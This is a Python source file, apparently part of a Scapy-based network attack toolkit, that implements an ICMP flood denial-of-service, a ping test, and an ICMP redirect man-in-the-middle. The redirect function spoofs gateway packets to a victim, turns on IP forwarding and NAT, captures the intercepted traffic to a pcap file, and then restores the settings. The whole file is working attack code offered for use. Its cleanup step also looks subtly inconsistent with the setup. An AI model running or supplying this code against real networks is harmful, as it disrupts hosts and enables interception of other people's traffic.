import os
from scapy.layers.inet import ICMP, IP, UDP
from scapy.layers.l2 import Ether, Dot3
from scapy.sendrecv import AsyncSniffer, sendp, send
from scapy.all import get_if_addr, get_if_hwaddr
from scapy.packet import Packet, Raw
from libs.aux_funcs import type_wrapper,attack_cat,attack_layer,attack_type,EXIT_SIGNAL, send_l2_loop, send_l3_single, send_l3_loop, send_l2_single, pcap_dump

@type_wrapper(name="ICMP Flood", type=attack_type.DoS, category=attack_cat.Attack, layer=attack_layer.L4, arg_list=['dest_ip'])
def icmp_flood(args):
    iface=args["iface"]
    dst_ip = args["dest_ip"]
    pkt = args['pkt']

    # Create attack layers
    base_pkt = ICMP()/Raw(b'A'*3)

    # Check for pre-existing layers
    if pkt != None:
        if pkt.haslayer(IP):
            pkt = pkt/base_pkt
        else:
            pkt = pkt/IP(dst = dst_ip, src=get_if_addr(iface))/base_pkt
    else:
        pkt = IP(dst=dst_ip, src=get_if_addr(iface))/base_pkt
    
    args["pkt"] = pkt

    # Select appropriate function and send the packet
    if pkt.haslayer(Ether) or pkt.haslayer(Dot3):
        send_l2_loop(args)
    else:
        send_l3_loop(args)

@type_wrapper(name="Ping test", type=attack_type.Test, category=attack_cat.Attack, layer=attack_layer.L4, arg_list=['dest_ip'])
def icmp_test(args):
    iface=args["iface"]
    dst_ip = args["dest_ip"]
    pkt = args['pkt']

    # Create attack layers
    base_pkt = ICMP()/Raw(b'A'*3)

    # Check for pre-existing layers
    if pkt != None:
        if pkt.haslayer(IP):
            pkt = pkt/base_pkt
        else:
            pkt = pkt/IP(dst = dst_ip, src=get_if_addr(iface))/base_pkt
    else:
        pkt = IP(dst=dst_ip, src=get_if_addr(iface))/base_pkt
    
    args['pkt'] = pkt

    if pkt.haslayer(Ether) or pkt.haslayer(Dot3):
        send_l2_single(args)
    else:
        send_l3_single(args)
    

@type_wrapper(name="ICMP Redirection", type=attack_type.MitM, category=attack_cat.Attack, layer=attack_layer.L4, arg_list=["victim_IP","gateway_IP","target_IP","network"])
def icmp_redirect(args):
    """
    Perfoms an ICMP Redirection attack.
    Requires several arguments:
    arg             desc                                                example value
    victim_IP       IP address of the victim in the local network       192.168.1.101
    gateway_IP      IP address of the default gateway                   192.168.1.1
    target_IP       IP address of the destination machine               10.10.0.101
    network         Network base address with subnet mask               192.168.1.0/24
    """

    victim_ip = args["victim_IP"]
    gw_ip = args["gateway_IP"]
    target_ip = args["target_IP"]
    network = args["network"]

    pkt = args["pkt"]

    # Create the ICMP redirect packet
    if pkt == None:
        pkt = IP(src=gw_ip, dst=victim_ip)/ICMP(type=5, code=1,gw=get_if_addr(args["iface"]))/IP(src=victim_ip,dst=target_ip)/UDP()
    else:
        pkt = pkt/IP(src=gw_ip, dst=victim_ip)/ICMP(type=5, code=1,gw=get_if_addr(args["iface"]))/IP(src=victim_ip,dst=target_ip)/UDP()

    args['pkt'] = pkt

    # Before sending redirect, make NAT rules in IP table, enable IP forwarding and disable our own ICMP redirects
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system(f"echo 0 > /proc/sys/net/ipv4/conf/{args['iface']}/send_redirects")
    os.system("echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects")
    os.system(f"iptables-nft -t nat -A POSTROUTING -s {network} -o {args['iface']} -j MASQUERADE")

    # Send the redirect
    send_l3_single(args)

    print("Done.")

    asniff = AsyncSniffer(lfilter = lambda x: \
        (x.haslayer(Ether) and\
        (x[Ether].src == get_if_hwaddr(args['iface']) or\
         x[Ether].dst == get_if_hwaddr(args['iface']) ) or \
        (x.haslayer(Dot3) and ()) and\
        (x[Dot3].src == get_if_hwaddr(args['iface']) or\
         x[Dot3].dst == get_if_hwaddr(args['iface']))),\
        iface = args['iface'])

    asniff.start()

    while not EXIT_SIGNAL.is_set():
        continue #IDLE
   
    plist = asniff.stop()

    pcap_dump(plist, "ICMP_MITM")

    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system(f"echo 1 > /proc/sys/net/ipv4/conf/{args['iface']}/send_redirects")
    os.system("echo 1 > /proc/sys/net/ipv4/conf/all/send_redirects")
    os.system(f"iptables -t NAT -D POSTROUTING -s {network} -o {args['iface']} -j MASQUERADE")
    return